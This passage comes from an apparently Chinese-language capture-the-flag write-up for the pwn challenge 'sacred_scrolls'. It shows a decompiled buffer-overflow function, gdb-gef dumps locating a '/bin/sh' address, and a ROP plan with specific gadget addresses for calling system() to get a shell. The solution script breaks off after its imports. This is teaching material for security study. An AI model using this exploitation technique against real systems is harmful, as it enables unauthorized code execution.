</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8be9fd>int</span> <span style=color:#ff79c6>__fastcall</span> <span style=color:#50fa7b>spell_save</span>(<span style=color:#ff79c6>const</span> <span style=color:#8be9fd>void</span> <span style=color:#ff79c6>*</span>a1)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#8be9fd>char</span> dest[<span style=color:#bd93f9>32</span>]; <span style=color:#6272a4>// [rsp+10h] [rbp-20h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>
</span></span><span style=display:flex><span>  <span style=color:#50fa7b>memcpy</span>(dest, a1, <span style=color:#bd93f9>600uLL</span>);
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>return</span> <span style=color:#50fa7b>printf</span>(<span style=color:#f1fa8c>&#34;%s</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>[-] This spell is not quiet effective, thus it will not be saved!</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span>, <span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\x1B</span><span style=color:#f1fa8c>[1;31m&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>這裡很顯然有 bof，只給 32 bytes 結果可以輸入 600 bytes 的內容，追一下 a1 是從哪來的，
可以發現是 wizard_tag。</p><h2 id=exploit>Exploit</h2><p>開 gdb 找 libc 的位置</p><p>不知道為啥 gdb-peda 不能正常執行，但 gdb-gef 可以&mldr;</p><p>中斷在輸入 wizard_tag 的地方看看</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>Enter your wizard tag: ^C                                                                                                                                            
</span></span><span style=display:flex><span>Program received signal SIGINT, Interrupt.                                                                                                                           
</span></span><span style=display:flex><span>0x00007ffff7d14992 in <span style=color:#8be9fd;font-style:italic>read</span> <span style=color:#ff79c6>()</span> from ./glibc/libc.so.6                                                                                                                 
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span> Legend: Modified register | Code | Heap | Stack | String <span style=color:#ff79c6>]</span>
</span></span><span style=display:flex><span>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$rax</span>   : 0xfffffffffffffe00
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$rbx</span>   : 0x0               
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$rcx</span>   : 0x00007ffff7d14992  →  0x5677fffff0003d48 <span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;H=&#34;</span>?<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$rdx</span>   : 0x5ff             
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$rsp</span>   : 0x00007fffffffd598  →  0x0000000000400f94  →  &lt;main+178&gt; mov rax, QWORD PTR <span style=color:#ff79c6>[</span>rbp-0x38<span style=color:#ff79c6>]</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$rbp</span>   : 0x00007fffffffdca0  →  0x0000000000000001
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$rsi</span>   : 0x00007fffffffd5a0  →  0x000000000000001f
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$rdi</span>   : 0x0               
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$rip</span>   : 0x00007ffff7d14992  →  0x5677fffff0003d48 <span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;H=&#34;</span>?<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$r8</span>    : 0x18              
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$r9</span>    : 0x7fffffff        
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$r10</span>   : 0x0000000000401f46  →  <span style=color:#f1fa8c>&#34;\nEnter your wizard tag: &#34;</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$r11</span>   : 0x246             
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$r12</span>   : 0x600             
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$r13</span>   : 0x0               
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$r14</span>   : 0x600             
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$r15</span>   : 0x0               
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$eflags</span>: <span style=color:#ff79c6>[</span>ZERO carry PARITY adjust sign <span style=color:#8be9fd;font-style:italic>trap</span> INTERRUPT direction overflow resume virtualx86 identification<span style=color:#ff79c6>]</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$cs</span>: 0x33 <span style=color:#8be9fd;font-style:italic>$ss</span>: 0x2b <span style=color:#8be9fd;font-style:italic>$ds</span>: 0x00 <span style=color:#8be9fd;font-style:italic>$es</span>: 0x00 <span style=color:#8be9fd;font-style:italic>$fs</span>: 0x00 <span style=color:#8be9fd;font-style:italic>$gs</span>: 0x00 
</span></span><span style=display:flex><span>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
</span></span><span style=display:flex><span>0x00007fffffffd598│+0x0000: 0x0000000000400f94  →  &lt;main+178&gt; mov rax, QWORD PTR <span style=color:#ff79c6>[</span>rbp-0x38<span style=color:#ff79c6>]</span>      ← <span style=color:#8be9fd;font-style:italic>$rsp</span>
</span></span><span style=display:flex><span>0x00007fffffffd5a0│+0x0008: 0x000000000000001f   ← <span style=color:#8be9fd;font-style:italic>$rsi</span>
</span></span><span style=display:flex><span>0x00007fffffffd5a8│+0x0010: 0x0000000000000000
</span></span><span style=display:flex><span>0x00007fffffffd5b0│+0x0018: 0x00007ffff7dd8698  →  0x0068732f6e69622f <span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;/bin/sh&#34;</span>?<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>0x00007fffffffd5b8│+0x0020: 0x00000000f7ceb0f0
</span></span><span style=display:flex><span>0x00007fffffffd5c0│+0x0028: 0x0000000000000000
</span></span><span style=display:flex><span>0x00007fffffffd5c8│+0x0030: 0x00000000ffffd9f0
</span></span><span style=display:flex><span>0x00007fffffffd5d0│+0x0038: 0x00007fff00000000
</span></span><span style=display:flex><span>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
</span></span><span style=display:flex><span>   0x7ffff7d1498c &lt;read+12&gt;        <span style=color:#8be9fd;font-style:italic>test</span>   eax, eax
</span></span><span style=display:flex><span>   0x7ffff7d1498e &lt;read+14&gt;        jne    0x7ffff7d149a0 &lt;read+32&gt;
</span></span><span style=display:flex><span>   0x7ffff7d14990 &lt;read+16&gt;        syscall 
</span></span><span style=display:flex><span> → 0x7ffff7d14992 &lt;read+18&gt;        cmp    rax, 0xfffffffffffff000
</span></span><span style=display:flex><span>   0x7ffff7d14998 &lt;read+24&gt;        ja     0x7ffff7d149f0 &lt;read+112&gt;
</span></span><span style=display:flex><span>   0x7ffff7d1499a &lt;read+26&gt;        ret    
</span></span><span style=display:flex><span>   0x7ffff7d1499b &lt;read+27&gt;        nop    DWORD PTR <span style=color:#ff79c6>[</span>rax+rax*1+0x0<span style=color:#ff79c6>]</span>
</span></span><span style=display:flex><span>   0x7ffff7d149a0 &lt;read+32&gt;        sub    rsp, 0x28
</span></span><span style=display:flex><span>   0x7ffff7d149a4 &lt;read+36&gt;        mov    QWORD PTR <span style=color:#ff79c6>[</span>rsp+0x18<span style=color:#ff79c6>]</span>, rdx
</span></span><span style=display:flex><span>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span><span style=color:#6272a4>#0] Id 1, Name: &#34;sacred_scrolls&#34;, stopped 0x7ffff7d14992 in read (), reason: SIGINT</span>
</span></span><span style=display:flex><span>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span><span style=color:#6272a4>#0] 0x7ffff7d14992 → read()</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span><span style=color:#6272a4>#1] 0x400f94 → main()</span>
</span></span><span style=display:flex><span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</span></span></code></pre></td></tr></table></div></div><p>此時斷的地方是 read()，根據 Calling Convention，wizard_tag 的位址應放在 $rsi</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>gef➤  x/20gx <span style=color:#8be9fd;font-style:italic>$rsi</span>
</span></span><span style=display:flex><span>0x7fffffffd5a0: 0x000000000000001f      0x0000000000000000
</span></span><span style=display:flex><span>0x7fffffffd5b0: 0x00007ffff7dd8698      0x00000000f7ceb0f0
</span></span><span style=display:flex><span>0x7fffffffd5c0: 0x0000000000000000      0x00000000ffffd9f0
</span></span><span style=display:flex><span>0x7fffffffd5d0: 0x00007fff00000000      0x0000000000000004
</span></span><span style=display:flex><span>0x7fffffffd5e0: 0x00007fff00000000      0x0000000000000000
</span></span><span style=display:flex><span>0x7fffffffd5f0: 0x0000000000000000      0x0000000000000000
</span></span><span style=display:flex><span>0x7fffffffd600: 0x0000000000000000      0x0000000000000000
</span></span><span style=display:flex><span>0x7fffffffd610: 0x0000000000000000      0x0000000000000000
</span></span><span style=display:flex><span>0x7fffffffd620: 0x0000000000000000      0x00007ffff7fce37c
</span></span><span style=display:flex><span>0x7fffffffd630: 0x00007ffff7fbb1f0      0x00007ffff7c04ad0
</span></span><span style=display:flex><span>gef➤  
</span></span></code></pre></td></tr></table></div></div><p>其中記憶體位置是 0x7fff 開頭的全都是 libc 相關的位址，看看第一個是什麼</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>gef➤  x/s 0x00007ffff7dd8698
</span></span><span style=display:flex><span>0x7ffff7dd8698: <span style=color:#f1fa8c>&#34;/bin/sh&#34;</span>
</span></span><span style=display:flex><span>gef➤  
</span></span></code></pre></td></tr></table></div></div><p>超幸運！第一個就是熟悉的 <code>/bin/sh</code>，而這個位址在 <code>wizard_tag+16</code> 的地方，
所以只要填 16 bytes 的垃圾就能 leak 出 address。</p><p>接著需要準備一個 payload 開始做 ROP</p><p>為了通過檢查，前面 7 bytes 必須是 <code>\xf0\x9f\x91\x93\xe2\x9a\xa1</code>，
位移量則為 32 (陣列宣告長度) + 8(x64 rbp 偏移距離) - 7(已經填好的 bytes)，需要填 33 bytes 的垃圾。</p><p>再來要蓋掉 return address，目標是 system，步驟是把 <code>pop rdi; ret;</code> 這個 gadget 放進去，rdi 就會拿到後面接著的 &ldquo;/bin/sh&rdquo;，</p><p>這樣參數就準備好了，然而呼叫 libc 函數在 64 位元下需要做記憶體對齊，否則會噴 segmentation fault，所以再加一個 <code>ret;</code> 給他就好。</p><p>利用 ROPgadget</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>$ ROPgadget --binary ./sacred_scrolls 
</span></span></code></pre></td></tr></table></div></div><p>找到需要的 gadget 分別在 0x4011b3 以及 0x4007ce</p><p>找 system() 的位址，可以直接用 <code>elf.plt['system']</code> 找</p><p>最後就是 get shell，cat flag.txt！</p><h2 id=solution>Solution</h2><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>from</span> pwn <span style=color:#ff79c6>import</span> <span style=color:#ff79c6>*</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> os
</span></span><span style=display:flex><span>                                                                                                                                                                     
